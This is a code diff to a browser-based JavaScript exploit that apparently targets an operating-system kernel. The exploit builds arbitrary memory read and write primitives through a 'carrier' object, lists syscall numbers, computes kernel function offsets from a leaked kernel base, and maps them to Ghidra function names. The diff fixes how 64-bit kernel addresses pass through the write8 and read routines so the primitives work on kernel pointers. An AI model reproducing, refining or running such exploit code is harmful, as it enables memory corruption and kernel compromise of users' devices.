@@ -82,7 +82,6 @@ function hx8(x)  { return ("0" + ((x >>> 0) & 0xff).toString(16)).slice(-2); }
 function hx32(x) { return ("00000000" + ((x >>> 0).toString(16))).slice(-8); }
 function phex(v) { return "0x" + hx32(v.hi) + hx32(v.low); }
 function zero(v) { return ((v.low >>> 0) === 0) && ((v.hi >>> 0) === 0); }
-function i64ToNum(v) { return (v.hi >>> 0) * 0x100000000 + (v.low >>> 0); }
 
 const SYS = { socket: 0x61, close: 6, getpid: 20, getuid: 0x18 };
 const AF_UNIX = 1, SOCK_STREAM = 1, AF_INET6 = 28;
@@ -147,6 +146,11 @@ window.addEventListener("unhandledrejection", (ev) => {
              " leakSlotAddr=" + hx32(carrier.leakSlotAddress >>> 0));
 
         // ---------- read primitive ----------
+        //
+        // carrier.aim accepts either a JS number (safe only below 2^48)
+        // or an int64-like {low, hi}. Kernel addresses must go through
+        // the int64 path — a 64-bit pointer cannot survive round-tripping
+        // through a JS double.
 
         const CV = carrier.view;
         if (!CV || CV.length < 0x100) throw new Error("carrier.view missing");
@@ -154,8 +158,7 @@ window.addEventListener("unhandledrejection", (ev) => {
         const REUSE = new Uint8Array(0x200);
 
         function readBytesAt(addr, n) {
-            const addrNum = (typeof addr === "number") ? addr : i64ToNum(addr);
-            carrier.aim(addrNum);
+            carrier.aim(addr);
             for (let i = 0; i < n; ++i) REUSE[i] = CV[i];
             carrier.restore();
             return REUSE.subarray(0, n);
@@ -176,11 +179,41 @@ window.addEventListener("unhandledrejection", (ev) => {
             return new int64(lo, hi);
         }
         function write8(a, v) {
-            const addrNum = (typeof a === "number") ? a : i64ToNum(a);
-            const lo = (typeof v === "number") ? (v >>> 0) : (v.low >>> 0);
-            const hi = (typeof v === "number")
-                ? (v < 0 ? 0xffffffff : 0) : (v.hi >>> 0);
-            carrier.aim(addrNum);
+            let lo, hi;
+            if (typeof v === "number") {
+                if (!Number.isFinite(v) || Math.floor(v) !== v) {
+                    throw new TypeError("write8: non-integer number " + v);
+                }
+                if (v < 0) {
+                    const mag = -v;
+                    const hiMag = Math.floor(mag / 0x100000000);
+                    const loMag = mag - hiMag * 0x100000000;
+                    if (loMag === 0) {
+                        hi = (0x100000000 - hiMag) >>> 0;
+                        lo = 0;
+                    } else {
+                        hi = (0x100000000 - hiMag - 1) >>> 0;
+                        lo = (0x100000000 - loMag) >>> 0;
+                    }
+                } else if (v <= 0xffffffff) {
+                    hi = 0;
+                    lo = v >>> 0;
+                } else if (v <= 0xffffffffffff) {
+                    hi = Math.floor(v / 0x100000000);
+                    lo = v - hi * 0x100000000;
+                } else {
+                    throw new RangeError(
+                        "write8: numeric value exceeds 48-bit range; " +
+                        "pass an int64");
+                }
+            } else if (v && typeof v === "object" &&
+                       "low" in v && "hi" in v) {
+                lo = v.low >>> 0;
+                hi = v.hi >>> 0;
+            } else {
+                throw new TypeError("write8: expected number or {low, hi}");
+            }
+            carrier.aim(a);
             CV[0] = lo & 0xff;
             CV[1] = (lo >>> 8) & 0xff;
             CV[2] = (lo >>> 16) & 0xff;
@@ -461,9 +494,12 @@ window.addEventListener("unhandledrejection", (ev) => {
         const rvaHi = ((fn.hi >>> 0) - (KBASE.hi >>> 0)) >>> 0;
         mark("FN_RVA", "0x" + hx32(rvaHi) + hx32(rvaLo));
 
-        const ghidra = ((fn.low >>> 0) - (KBASE.low >>> 0) + 0x680000) >>> 0;
-        mark("FN_HINT", "1302.elf.c  ->  FUN_" +
-             hx32(ghidra).replace(/^00+/, ""));
+        // Ghidra base. The listing shows FUN_00ef74b0, so the project has
+        // the kernel image loaded at base 0. If that changes, set this to
+        // whatever the project's base actually is.
+        const GHIDRA_BASE = 0;
+        const ghidra = (rvaLo + GHIDRA_BASE) >>> 0;
+        mark("FN_HINT", "1302.elf.c  ->  FUN_" + hx32(ghidra));
 
         {
             const blk = readBytesAt(fn, 0x100);
